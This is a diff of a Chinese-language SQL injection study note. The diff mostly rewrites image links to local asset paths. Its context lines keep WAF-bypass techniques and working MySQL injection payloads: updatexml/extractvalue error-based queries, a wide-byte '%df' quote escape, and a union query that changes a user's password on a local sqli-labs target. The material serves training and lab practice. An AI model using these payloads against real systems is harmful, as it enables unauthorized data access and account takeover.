@@ -699,15 +699,15 @@ python sqlmap.py [选项]
 ```
 
 实例:
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666767888898-cc7bea95-1b04-4fea-b995-9ff16bb9d38d.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666767888898-cc7bea95-1b04-4fea-b995-9ff16bb9d38d.png)
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666767908067-787addd2-d49e-41a1-a0d0-266c19aab48c-166912403146839.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666767908067-787addd2-d49e-41a1-a0d0-266c19aab48c-166912403146839.png)
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666767983683-86522a64-ad50-4d4e-83b7-6f9d346c6d49-166912403146841.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666767983683-86522a64-ad50-4d4e-83b7-6f9d346c6d49-166912403146841.png)
+[![image.png](../../../_assets/images/cdf444d21d8ef52301f6e5aeff700cd2009f46b0f694470ec9a67caf49a668a8.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666767888898-cc7bea95-1b04-4fea-b995-9ff16bb9d38d.png)
+[![image.png](../../../_assets/images/233d25656902b6e10c8bb0de788e4b9563d03c26287f3a894e8f846188874cca.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666767908067-787addd2-d49e-41a1-a0d0-266c19aab48c-166912403146839.png)
+[![image.png](../../../_assets/images/323d3d155045a206462c1491b0d0b10318343a46a6d1f84b4cd54113e752035c.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666767983683-86522a64-ad50-4d4e-83b7-6f9d346c6d49-166912403146841.png)
 
 # 大小写绕过
 
 常用于 waf的正则对大小写不敏感的情况，一般都是题目自己故意这样设计。
 例如：waf过滤了关键字select，可以尝试使用Select等绕过。
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666768100924-7947e747-35b5-4167-8f97-fb5a22db45d4.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666768100924-7947e747-35b5-4167-8f97-fb5a22db45d4.png)
+[![image.png](../../../_assets/images/9e140898588469230ed50d69d57d6e7688503f9fbf19d7ca0f74f9a5743dda2c.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666768100924-7947e747-35b5-4167-8f97-fb5a22db45d4.png)
 
 # 注释绕过
 
@@ -721,7 +721,7 @@ index.php?id=-1 union/*aaaaaaaaaaaaaaa(1万个a)aaaaaaaaaaaaaaaaa*/select 1,2,3
 # 内联注释绕过
 
 内联注释就是把一些特有的仅在MYSQL上的语句放在 /*!…*/ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666768162774-ce9f4f40-99e4-4bc9-acbd-4b3c5b2f23a5.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666768162774-ce9f4f40-99e4-4bc9-acbd-4b3c5b2f23a5.png)
+[![image.png](../../../_assets/images/d97625cd00d94a42fe10bed5702fbbde948edc0fa8e0f4590c72c989739faa5c.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666768162774-ce9f4f40-99e4-4bc9-acbd-4b3c5b2f23a5.png)
 
 ## 双写关键字绕过
 
@@ -758,7 +758,7 @@ tip:好像新版mysql不能用了 ，反正遇到多试试吧！
 ## url编码绕过
 
 这个有条件，前提时后端过滤以后进行url解码，这时候可以对”这些符号或者字符进行两次url编码
-[![078f9b18a9d913c0123dcccf05c137dd.jpg](https://cdn.nlark.com/yuque/0/2022/jpeg/32380857/1666790234001-83e2175a-f41a-4549-a7d6-5fcdfc619bdf.jpeg#clientId=u65160aa9-d068-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=238&id=uc170500e&margin=%5Bobject%20Object%5D&name=078f9b18a9d913c0123dcccf05c137dd.jpg&originHeight=298&originWidth=1096&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61815&status=done&style=none&taskId=u6e69cf22-741d-4abe-a151-10dca260ccd&title=&width=876.8)](https://cdn.nlark.com/yuque/0/2022/jpeg/32380857/1666790234001-83e2175a-f41a-4549-a7d6-5fcdfc619bdf.jpeg#clientId=u65160aa9-d068-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=238&id=uc170500e&margin=[object Object]&name=078f9b18a9d913c0123dcccf05c137dd.jpg&originHeight=298&originWidth=1096&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61815&status=done&style=none&taskId=u6e69cf22-741d-4abe-a151-10dca260ccd&title=&width=876.8)
+[![078f9b18a9d913c0123dcccf05c137dd.jpg](../../../_assets/images/dd719cfe3b1e128e697e1041efa8684eb2d528f2565c0685091932dd6f5d8def.jpg)](https://cdn.nlark.com/yuque/0/2022/jpeg/32380857/1666790234001-83e2175a-f41a-4549-a7d6-5fcdfc619bdf.jpeg#clientId=u65160aa9-d068-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=238&id=uc170500e&margin=[object Object]&name=078f9b18a9d913c0123dcccf05c137dd.jpg&originHeight=298&originWidth=1096&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61815&status=done&style=none&taskId=u6e69cf22-741d-4abe-a151-10dca260ccd&title=&width=876.8)
 
 ## unicode编码绕过
 
@@ -781,10 +781,10 @@ tap
 两个空格
 ```
 
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666782853847-a136179a-f8da-406d-8fce-5982a0c26636-166912403146946.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666782853847-a136179a-f8da-406d-8fce-5982a0c26636-166912403146946.png)
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666782900873-042acb46-07f4-4645-ba99-4db87a159f3e-166912403146948.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666782900873-042acb46-07f4-4645-ba99-4db87a159f3e-166912403146948.png)
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666782960545-2633b2f1-ab42-4d3f-bfc3-0e84d9bd6cc2-166912403146950.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666782960545-2633b2f1-ab42-4d3f-bfc3-0e84d9bd6cc2-166912403146950.png)
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666782995285-ead5c057-0a63-4024-933d-c0098a29550b-166912403146952.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666782995285-ead5c057-0a63-4024-933d-c0098a29550b-166912403146952.png)
+[![image.png](../../../_assets/images/2f1b94308895250972bcc9cfec55d11e4a3c94cfa5af8a7c679f4bb1d99dec8e.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666782853847-a136179a-f8da-406d-8fce-5982a0c26636-166912403146946.png)
+[![image.png](../../../_assets/images/25ace185f02c40e46d080f9069bf339557a0204d101bcd20332e42124143c9e8.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666782900873-042acb46-07f4-4645-ba99-4db87a159f3e-166912403146948.png)
+[![image.png](../../../_assets/images/f737313990eb628469e9bcd1c0f6ce90373c9e76f4016029e46d0b79546927e4.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666782960545-2633b2f1-ab42-4d3f-bfc3-0e84d9bd6cc2-166912403146950.png)
+[![image.png](../../../_assets/images/9f8c01dc031f82a3415e0f23c96a0debd6383e8a42cb22416f38d90f0ec823f7.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666782995285-ead5c057-0a63-4024-933d-c0098a29550b-166912403146952.png)
 
 # 过滤or and xor not 绕过
 
@@ -801,34 +801,34 @@ not = !
 
 不加通配符的like执行的效果和=一致，所以可以用来绕过。
 ** 正常加上通配符的like:**
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666783130840-322e337e-c4e9-4eb1-ade9-98797c19624b-166912403146954.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666783130840-322e337e-c4e9-4eb1-ade9-98797c19624b-166912403146954.png)
+[![image.png](../../../_assets/images/ada762fceae361ffe40b267c8c7c3326f3321310af81ffb731f6f4cc6233f613.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666783130840-322e337e-c4e9-4eb1-ade9-98797c19624b-166912403146954.png)
 ** 不加上通配符的like可以用来取代=:**
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666783196934-51d6dabd-9e99-4074-9110-22efe27cadd3-166912403146956.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666783196934-51d6dabd-9e99-4074-9110-22efe27cadd3-166912403146956.png)
+[![image.png](../../../_assets/images/7de5cc264ef9da587cf07766007dde8e3ab5a5627bdbab0c706300a4aba4fc87.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666783196934-51d6dabd-9e99-4074-9110-22efe27cadd3-166912403146956.png)
 
 ## rlike绕过
 
 ** rlike:模糊匹配，只要字段的值中存在要查找的 部分 就会被选择出来**
 用来取代=时，rlike的用法和上面的like一样，没有通配符效果和=一样
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666783287214-2907bb1b-d180-4b9a-bf9d-6d7727cb2919-166912403146958.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666783287214-2907bb1b-d180-4b9a-bf9d-6d7727cb2919-166912403146958.png)
+[![image.png](../../../_assets/images/ab9695cf8989415f33967ed43acb349d4eda6d758caf183af58592de7019c7bc.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666783287214-2907bb1b-d180-4b9a-bf9d-6d7727cb2919-166912403146958.png)
 
 ## regexp绕过
 
 regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666783387574-65ffe75e-60ef-4569-8209-1f704f75ccf3-166912403146960.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666783387574-65ffe75e-60ef-4569-8209-1f704f75ccf3-166912403146960.png)
+[![image.png](../../../_assets/images/bd67e7c768383aeb8b48bacb2c12e4012311dd65c87dfcf28b829d264622f636.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666783387574-65ffe75e-60ef-4569-8209-1f704f75ccf3-166912403146960.png)
 
 ## 使用大小于号来绕过
 
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666783427074-e021ae59-4b24-42a9-bf2f-ddbc310bf2bc-166912403146962.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666783427074-e021ae59-4b24-42a9-bf2f-ddbc310bf2bc-166912403146962.png)
+[![image.png](../../../_assets/images/cd262d0aa36aa6167988f57f27cb7667194f6a1451d15f27416ade4264d0f043.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666783427074-e021ae59-4b24-42a9-bf2f-ddbc310bf2bc-166912403146962.png)
 
 ## <> 等价于 !=
 
 所以在前面再加一个!结果就是等号了
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666783488413-ecce5e46-10e2-4873-b0e9-c833976b6440-166912403146964.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666783488413-ecce5e46-10e2-4873-b0e9-c833976b6440-166912403146964.png)
+[![image.png](../../../_assets/images/88d72edd48aab3eab400eff72e806f88b15219f278877728aab851697bbe9e4c.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666783488413-ecce5e46-10e2-4873-b0e9-c833976b6440-166912403146964.png)
 
 # 过滤大小于号绕过
 
 为了方便测试，我把表的内容修改了一下:
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666783825320-7d3035e0-ebae-4ed3-8a89-95c0330ea498-166912403146966.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666783825320-7d3035e0-ebae-4ed3-8a89-95c0330ea498-166912403146966.png)
+[![image.png](../../../_assets/images/ed4fe257ad9f61f0785415d9d2008bcf8eefc2fe5c6ee1ce484f97d48d1a27fa.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666783825320-7d3035e0-ebae-4ed3-8a89-95c0330ea498-166912403146966.png)
 在sql盲注中，一般使用大小于号来判断ascii码值的大小来达到爆破的效果。但是如果过滤了大小于号的话， 我们 可以使用以下的关键字来绕过
 
 ## greatest绕过
@@ -1137,7 +1137,7 @@ index.php?name=first&name=last
 ```
 
 而由于部分中间件的不同，部分检测规则存在差异，下面是一些服务器检测规则：
-[![8b2d8e44a6d34ea9b7b6e19a1fc6ccb9.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666791032465-94ed2b6c-3422-4ca0-ae48-3eec1145a569.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666791032465-94ed2b6c-3422-4ca0-ae48-3eec1145a569.png)
+[![8b2d8e44a6d34ea9b7b6e19a1fc6ccb9.png](../../../_assets/images/642b2c5f91e60a8f265b3a3664ec56ad0cc4d95724447d98fbfba513db8676e7.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666791032465-94ed2b6c-3422-4ca0-ae48-3eec1145a569.png)
 
 # **keep-alive(持久连接)**
 
@@ -1149,7 +1149,7 @@ index.php?name=first&name=last
 一些 WAF 对于get请求和post请求的处理机制不一样，可能对 POST 请求稍加松懈，因此给GET请求变成POST请求有可能绕过拦截。
 一些 WAF 检测到POST请求后，就不会对GET携带的参数进行过滤检测，因此导致被绕过。
 一般方法便是采用burpsuite抓包，更改提交方式，如下
-[![6bcc270dcc934c7984213eb916a17f18.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666791171451-68652e53-879a-46d9-ab0e-b574caa44cee.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666791171451-68652e53-879a-46d9-ab0e-b574caa44cee.png)
+[![6bcc270dcc934c7984213eb916a17f18.png](../../../_assets/images/d8583e8a308183ed9929ee67d8f91b219dc402cf1ccb7141a69436ce03d05f36.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666791171451-68652e53-879a-46d9-ab0e-b574caa44cee.png)
 
 # 静态资源
 
@@ -1217,7 +1217,7 @@ SQL注入实质上是将用户传入的参数没有进行严格的处理拼接sq
 # 常用语句
 
 information_schema包含了大量有用的信息，例如下图 :
-[![zawirg523g.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666794205856-324f76c8-fd02-42c4-8b07-acf208781212.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666794205856-324f76c8-fd02-42c4-8b07-acf208781212.png)
+[![zawirg523g.png](../../../_assets/images/e29db73f51ffef58011bf9caba6f1247a4d922feb16663fb921afa4ffacb8708.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666794205856-324f76c8-fd02-42c4-8b07-acf208781212.png)
 常用语句:
 
 ```
@@ -1377,7 +1377,7 @@ benchmark和笛卡尔积的原理实质上是运算时间过长导致的延迟
 union select count(*),2,concat(':',(select database()),':',floor(rand()*2))as a from information_schema.tables group by a       /*利用错误信息得到当前数据库名*/
 ```
 
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666847945122-532e8885-7278-4e3b-bcc4-7b8a42604734.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666847945122-532e8885-7278-4e3b-bcc4-7b8a42604734.png)
+[![image.png](../../../_assets/images/d6aa77294c75708ce95950a42fe445fbae50f608fb83c8aa183ff09d3818605e.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666847945122-532e8885-7278-4e3b-bcc4-7b8a42604734.png)
 **2 extractvalue()**
 updatexml一样，限制长度也是32位。
 
@@ -1385,7 +1385,7 @@ updatexml一样，限制长度也是32位。
 id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))
 ```
 
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666848282869-431f2e16-eef4-4a40-9352-585db732a0bc.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666848282869-431f2e16-eef4-4a40-9352-585db732a0bc.png)
+[![image.png](../../../_assets/images/0c75affd1388714ec6a64e157e877367d9d56be5bdf3efcd8b16590e35f92a63.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666848282869-431f2e16-eef4-4a40-9352-585db732a0bc.png)
 **3 updatexml()**
 updatexml（）这个函数最多只能爆32位字符，如果要爆的数据超过了这个位数，可以加上使用limit 0,1来查询后面数据。
 
@@ -1393,7 +1393,7 @@ updatexml（）这个函数最多只能爆32位字符，如果要爆的数据超
 id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))
 ```
 
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666848345412-c1787edd-3a00-482d-9f01-4c4d0ab5a9ed.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666848345412-c1787edd-3a00-482d-9f01-4c4d0ab5a9ed.png)
+[![image.png](../../../_assets/images/cae598ed49110226f195f9aa0b3fc82fdee2226797f5131f101eeec582a0ca64.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666848345412-c1787edd-3a00-482d-9f01-4c4d0ab5a9ed.png)
 **4 geometrycollection()**
 
 ```
@@ -1401,7 +1401,7 @@ id=1 and geometrycollection((select * from(select * from(select user())a)b))
 ```
 
 5.5<mysql版本<5.6
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666850740062-904d57c0-5523-4e67-ae20-f2e41a68db31.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666850740062-904d57c0-5523-4e67-ae20-f2e41a68db31.png)
+[![image.png](../../../_assets/images/b3afd962457cf009f34712a08f67ccb05e98d873b0162b0746f114a3236d92d7.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666850740062-904d57c0-5523-4e67-ae20-f2e41a68db31.png)
 后面几个用法一模一样，不再示范！
 **5 multipoint()**
 
@@ -1470,7 +1470,7 @@ mysql> select * from users where id=1;select * from users where id =2;
 
 **实例:sqllibs Less-38:**
 经过测试存在union联合注入,使用联合注入爆破出users表中有id、username、password三个 字段.
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666852427968-8100d5b0-a8ec-4eed-af6a-239de5fe82f4.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666852427968-8100d5b0-a8ec-4eed-af6a-239de5fe82f4.png)
+[![image.png](../../../_assets/images/4787fccaf14f16c312e5ac3060c8e885052eee0664aeaa450d0f9523f951e7f0.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666852427968-8100d5b0-a8ec-4eed-af6a-239de5fe82f4.png)
 我们来修改下这个用户的密码试试:
 
 ```
@@ -1478,9 +1478,9 @@ http://127.0.0.1/sqli-labs/Less-38/?id=-1'union select 1,username,password from 
 ```
 
 我们再来查询下,密码已经被改了
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666853455525-43a9bc6f-fc2d-4d15-963b-9514495b4c38.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666853455525-43a9bc6f-fc2d-4d15-963b-9514495b4c38.png)
+[![image.png](../../../_assets/images/4ae98aa5ee7693e20482be1e5d37a8be73c4d5d1728996d75d0ebf32641cdab8.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666853455525-43a9bc6f-fc2d-4d15-963b-9514495b4c38.png)
 如果select被过滤。可以搭配desc来读取表的字段
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667146017637-7253eec6-1f6e-42e0-9cb3-180eb4619f9e.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667146017637-7253eec6-1f6e-42e0-9cb3-180eb4619f9e.png)
+[![image.png](../../../_assets/images/feb006e55b36d6f6655bcba2357a404a4ade1d122b1ac036958ec5c3e7d36555.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667146017637-7253eec6-1f6e-42e0-9cb3-180eb4619f9e.png)
 
 # 宽字节注入
 
@@ -1503,20 +1503,20 @@ id = -1%df\' union select 1,user(),3,%23
 
 在 其中\的十六进制是%5c ,所以就构成了%df%5c，而在GBK编码方式下，%df%5c是一个繁体字“連”，所以单引号成功逃逸。
 用sqli-labs靶场进行演示，这里利用32关进行练习
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666854808597-8d091260-842e-4241-9924-e5c711538ba7.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666854808597-8d091260-842e-4241-9924-e5c711538ba7.png)
+[![image.png](../../../_assets/images/ba6c7eb144f2ab7c769b71db42d308d1d2cfe4d7665440f43ac1dcff0ce8a416.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666854808597-8d091260-842e-4241-9924-e5c711538ba7.png)
 加单引号没有反应，加上%df
 成功报错
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666854851705-427ddbe2-68ae-42ac-9f1c-425a3de566e0.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666854851705-427ddbe2-68ae-42ac-9f1c-425a3de566e0.png)
+[![image.png](../../../_assets/images/68ef18fb9e7b159c14985e34567b1e39923f07574028e1ca571a97284f1d33e9.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666854851705-427ddbe2-68ae-42ac-9f1c-425a3de566e0.png)
 后面的就正常查询即可，这里不再演示
 
 # 二次注入
 
 攻击者构造恶意的数据并存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。
 即输入恶意的数据库查询语句时会被转义，但在数据库调用读取语句时又被还原导致语句执行。
-[![40cf06a986854c5eb85bd683f9b15553.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666886911068-75bca2f0-2664-47d0-8622-ca7ce86bd20a.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666886911068-75bca2f0-2664-47d0-8622-ca7ce86bd20a.png)
+[![40cf06a986854c5eb85bd683f9b15553.png](../../../_assets/images/33fea6517b32a316dec189b50b51077f4071e32f5f3080631670d0d1d970b975.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666886911068-75bca2f0-2664-47d0-8622-ca7ce86bd20a.png)
 例题:**sql-labs 24**
 我们直接看源码，这是修改密码的部分:
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666887830878-82b43c68-1c06-44e3-8527-7185c46dafc7.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666887830878-82b43c68-1c06-44e3-8527-7185c46dafc7.png)
+[![image.png](../../../_assets/images/d7794ad8042760e99643ae08c99bfb7209ff046ee438255a9c42daca9cb4bd7d.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666887830878-82b43c68-1c06-44e3-8527-7185c46dafc7.png)
 如果我们输入的username变为:
 
 ```
@@ -1533,26 +1533,26 @@ UPDATE users SET PASSWORD='$pass' where username='$username'#
 密码: 123456
 ```
 
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666887956324-7b8db159-4370-4530-a6bb-fcdb075d4f8a.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666887956324-7b8db159-4370-4530-a6bb-fcdb075d4f8a.png)
+[![image.png](../../../_assets/images/d2783e6fcb756900eab65955f4fb9e6bf9cd4becaf1c3745a4c5d58633889a99.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666887956324-7b8db159-4370-4530-a6bb-fcdb075d4f8a.png)
 我们看下数据库:
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666888075339-a126f007-62a2-48df-a1a3-311008fe29a5.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666888075339-a126f007-62a2-48df-a1a3-311008fe29a5.png)
+[![image.png](../../../_assets/images/db6cc5a3bd9e62d67c93cc720cd3c59f448c8c2871ce8905643a8bfc2161d51e.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666888075339-a126f007-62a2-48df-a1a3-311008fe29a5.png)
 已经增加了用户进去,我们来修改下密码
 旧密码就随便填一个了，然后输入我们的新密码 HY666
 我们再看数据库，惊奇的发现admin的密码已经被改了
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666888302642-54292536-d66b-409d-9b24-d30c84d6a169.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666888302642-54292536-d66b-409d-9b24-d30c84d6a169.png)
+[![image.png](../../../_assets/images/7e5769bc9f9e494a709beb9aa2a42a1530831e3852624dbba9c783db22111039.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666888302642-54292536-d66b-409d-9b24-d30c84d6a169.png)
 
 # 异或注入
 
 异或是一种逻辑运算，运算法则简言之就是：两个条件相同（同真或同假）即为假(0)，两个条件不同即为真(1)，null与任何条件做异或运算都为null，如果从数学的角度理解就是，空集与任何集合的交集都为空。
 mysql里异或运算符为^ 或者 xor
 **两个同为真的条件做异或，结果为假**
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666884915483-ee8995c5-e81d-4566-85a2-29b17d2672c2.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666884915483-ee8995c5-e81d-4566-85a2-29b17d2672c2.png)
+[![image.png](../../../_assets/images/20e7fe9a3f9aa7c4417b7251ae7c6f68146811ee39570f5a343a4e980244da5d.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666884915483-ee8995c5-e81d-4566-85a2-29b17d2672c2.png)
 ** 两个同为假的条件做异或,结果为假**
-[![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666884955054-9f7afafe-2778-4c4a-9a7e-cfbb4efb5493.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666884955054-9f7afafe-2778-4c4a-9a7e-cfbb4efb5493.png)
+[![image.png](../../../_assets/images/b3a55f1f7637d5f3d367370564aec97bfc13b177b1c9686106eb382445afdb84.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666884955054-9f7afafe-2778-4c4a-9a7e-cfbb4efb5493.png)
 ** 一个条件为真,一个条件为假,结果为真**
